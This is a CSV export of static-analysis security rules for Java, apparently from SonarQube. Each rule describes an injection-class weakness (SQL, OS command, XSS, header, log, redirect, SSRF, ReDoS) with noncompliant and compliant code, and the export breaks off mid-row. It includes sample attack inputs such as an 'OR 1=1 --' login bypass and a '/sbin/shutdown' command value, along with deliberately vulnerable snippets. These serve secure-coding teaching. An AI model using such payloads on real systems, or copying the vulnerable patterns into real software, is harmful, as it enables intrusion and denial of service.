createdAt,htmlDesc,key,lang,langName,mdDesc,name,params,severity,sysTags,type
2018-06-18T12:48:49+0200,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean validate(javax.servlet.http.HttpServletRequest request) {
  String regex = request.getParameter(""regex"");
  String input = request.getParameter(""input"");

  // Enables attackers to force the web server to evaluate
  // regex such as ""(a+)+"" on inputs such as ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!""

  input.matches(regex);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean validate(javax.servlet.http.HttpServletRequest request) {
  String input = request.getParameter(""input"");

  input.matches(""a+"");  // Compliant - use a safe hardcoded regex
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",squid:S2631,java,Java,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean validate(javax.servlet.http.HttpServletRequest request) {
  String regex = request.getParameter(""regex"");
  String input = request.getParameter(""input"");

  // Enables attackers to force the web server to evaluate
  // regex such as ""(a+)+"" on inputs such as ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!""

  input.matches(regex);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean validate(javax.servlet.http.HttpServletRequest request) {
  String input = request.getParameter(""input"");

  input.matches(""a+"");  // Compliant - use a safe hardcoded regex
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",Regular expressions should not be vulnerable to Denial of Service attacks,[],BLOCKER,"['denial-of-service', 'owasp-a1']",VULNERABILITY
2018-06-18T12:48:49+0200,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, java.sql.Connection connection) throws SQLException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String query = ""SELECT * FROM users WHERE user = '"" + user + ""' AND pass = '"" + pass + ""'""; // Unsafe

  // If the special value ""foo' OR 1=1 --"" is passed as either the user or pass, authentication is bypassed
  // Indeed, if it is passed as a user, the query becomes:
  // SELECT * FROM users WHERE user = 'foo' OR 1=1 --' AND pass = '...'
  // As '--' is the comment till end of line syntax in SQL, this is equivalent to:
  // SELECT * FROM users WHERE user = 'foo' OR 1=1
  // which is equivalent to:
  // SELECT * FROM users WHERE 1=1
  // which is equivalent to:
  // SELECT * FROM users

  java.sql.Statement statement = connection.createStatement();
  java.sql.ResultSet resultSet = statement.executeQuery(query); // Noncompliant
  return resultSet.next();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, java.sql.Connection connection) throws SQLException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String query = ""SELECT * FROM users WHERE user = ? AND pass = ?""; // Safe even if authenticate() method is still vulnerable to brute-force attack in this specific case

  java.sql.PreparedStatement statement = connection.prepareStatement(query);
  statement.setString(1, user); // Will be properly escaped
  statement.setString(2, pass);
  java.sql.ResultSet resultSet = statement.executeQuery();
  return resultSet.next();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S3649,java,Java,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, java.sql.Connection connection) throws SQLException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String query = ""SELECT * FROM users WHERE user = '"" + user + ""' AND pass = '"" + pass + ""'""; // Unsafe

  // If the special value ""foo' OR 1=1 --"" is passed as either the user or pass, authentication is bypassed
  // Indeed, if it is passed as a user, the query becomes:
  // SELECT * FROM users WHERE user = 'foo' OR 1=1 --' AND pass = '...'
  // As '--' is the comment till end of line syntax in SQL, this is equivalent to:
  // SELECT * FROM users WHERE user = 'foo' OR 1=1
  // which is equivalent to:
  // SELECT * FROM users WHERE 1=1
  // which is equivalent to:
  // SELECT * FROM users

  java.sql.Statement statement = connection.createStatement();
  java.sql.ResultSet resultSet = statement.executeQuery(query); // Noncompliant
  return resultSet.next();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean authenticate(javax.servlet.http.HttpServletRequest request, java.sql.Connection connection) throws SQLException {
  String user = request.getParameter(""user"");
  String pass = request.getParameter(""pass"");

  String query = ""SELECT * FROM users WHERE user = ? AND pass = ?""; // Safe even if authenticate() method is still vulnerable to brute-force attack in this specific case

  java.sql.PreparedStatement statement = connection.prepareStatement(query);
  statement.setString(1, user); // Will be properly escaped
  statement.setString(2, pass);
  java.sql.ResultSet resultSet = statement.executeQuery();
  return resultSet.next();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",SQL queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",VULNERABILITY
2019-03-26T06:42:28+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value = req.getParameter(""value"");
  resp.addHeader(""X-Header"", value); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value = req.getParameter(""value"");

  // Allow only alphanumeric characters
  if (!value.matches(""[a-zA-Z0-9]++""))
    throw new IOException();

  resp.addHeader(""X-Header"", value);
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S5167,java,Java,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value = req.getParameter(""value"");
  resp.addHeader(""X-Header"", value); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value = req.getParameter(""value"");

  // Allow only alphanumeric characters
  if (!value.matches(""[a-zA-Z0-9]++""))
    throw new IOException();

  resp.addHeader(""X-Header"", value);
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",HTTP response headers should not be vulnerable to injection attacks,[],CRITICAL,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2015-01-08T13:39:43+0100,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void run(javax.servlet.http.HttpServletRequest request) throws IOException {
  String binary = request.getParameter(""binary"");

  // If the value ""/sbin/shutdown"" is passed as binary and the web server is running as root,
  // then the machine running the web server will be shut down and become unavailable for future requests

  Runtime.getRuntime().exec(binary); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run(javax.servlet.http.HttpServletRequest request) throws IOException {
  String binary = request.getParameter(""binary"");

  // Restrict to binaries within the current working directory whose name only contains letters
  if (!binary.matches(""[a-zA-Z]++"")) {
    throw new IllegalArgumentException();
  }

  Runtime.getRuntime().exec(binary);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S2076,java,Java,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void run(javax.servlet.http.HttpServletRequest request) throws IOException {
  String binary = request.getParameter(""binary"");

  // If the value ""/sbin/shutdown"" is passed as binary and the web server is running as root,
  // then the machine running the web server will be shut down and become unavailable for future requests

  Runtime.getRuntime().exec(binary); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run(javax.servlet.http.HttpServletRequest request) throws IOException {
  String binary = request.getParameter(""binary"");

  // Restrict to binaries within the current working directory whose name only contains letters
  if (!binary.matches(""[a-zA-Z]++"")) {
    throw new IllegalArgumentException();
  }

  Runtime.getRuntime().exec(binary);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",OS commands should not be vulnerable to injection attacks,[],BLOCKER,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:28+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String name = req.getParameter(""name"");
  PrintWriter out = resp.getWriter();
  out.write(""Hello "" + name); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String name = req.getParameter(""name"");
  String encodedName = org.owasp.encoder.Encode.forHtml(name);
  PrintWriter out = resp.getWriter();
  out.write(""Hello "" + encodedName);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S5131,java,Java,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String name = req.getParameter(""name"");
  PrintWriter out = resp.getWriter();
  out.write(""Hello "" + name); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String name = req.getParameter(""name"");
  String encodedName = org.owasp.encoder.Encode.forHtml(name);
  PrintWriter out = resp.getWriter();
  out.write(""Hello "" + encodedName);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks,[],BLOCKER,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:28+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter(""url"");
  resp.sendRedirect(location); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter(""url"");

  // Match the incoming URL against a whitelist
  if (!urlWhiteList.contains(location))
    throw new IOException();

  resp.sendRedirect(location);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",squid:S5146,java,Java,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter(""url"");
  resp.sendRedirect(location); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter(""url"");

  // Match the incoming URL against a whitelist
  if (!urlWhiteList.contains(location))
    throw new IOException();

  resp.sendRedirect(location);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",HTTP request redirections should not be open to forging attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2019-03-26T06:42:28+0100,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String param1 = req.getParameter(""param1"");
  Logger.info(""Param1: "" + param1 + "" "" + Logger.getName()); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String param1 = req.getParameter(""param1"");

  // Replace pattern-breaking characters
  param1 = param1.replaceAll(""[\n|\r|\t]"", ""_"");

  Logger.info(""Param1: "" + param1 + "" "" + Logger.getName());
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S5145,java,Java,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String param1 = req.getParameter(""param1"");
  Logger.info(""Param1: "" + param1 + "" "" + Logger.getName()); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String param1 = req.getParameter(""param1"");

  // Replace pattern-breaking characters
  param1 = param1.replaceAll(""[\n|\r|\t]"", ""_"");

  Logger.info(""Param1: "" + param1 + "" "" + Logger.getName());
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Logging should not be vulnerable to injection attacks,[],MINOR,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:28+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  URL url = new URL(req.getParameter(""url""));
  HttpURLConnection conn = (HttpURLConnection) url.openConnection(); // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  URL url = new URL(req.getParameter(""url""));

  // The safest way is to match the incoming URL against a whitelist
  if (!urlWhiteList.contains(url.toString()))
    throw new IOException();

  // If whitelisting is not possible, at least make sure that things like file:// and http://localhost are blocked
  InetAddress inetAddress = InetAddress.getByName(url.getHost());
  if (!url.getProtocol().startsWith(""http"") ||
      inetAddress.isAnyLocalAddress() ||
      inetAddress.isLoopbackAddress() ||
      inetAddress.isLinkLocalAddress())
    throw new IOException();

  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
